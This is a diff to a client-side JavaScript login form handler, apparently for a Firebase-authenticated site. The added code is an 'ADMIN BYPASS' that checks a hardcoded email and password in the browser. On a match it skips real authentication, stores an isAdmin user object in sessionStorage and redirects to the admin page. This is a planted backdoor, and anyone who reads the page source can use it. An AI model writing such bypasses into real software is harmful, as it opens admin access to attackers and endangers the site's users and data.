@@ -37,6 +37,19 @@ document.getElementById("loginForm").addEventListener("submit", async (e) => {
   const email = document.getElementById("email").value;
   const password = document.getElementById("password").value;
 
+  // 🛡️ ADMIN BYPASS
+  if (email === "Admin@0861" && password === "Admin@0861") {
+    sessionStorage.setItem("currentUser", JSON.stringify({
+      uid: "admin-root",
+      email: "Admin@0861",
+      name: "System Admin",
+      isAdmin: true,
+      loginTime: Date.now()
+    }));
+    window.location.href = "admin.html";
+    return;
+  }
+
   try {
     const userCredential = await signInWithEmailAndPassword(auth, email, password);
     const user = userCredential.user;
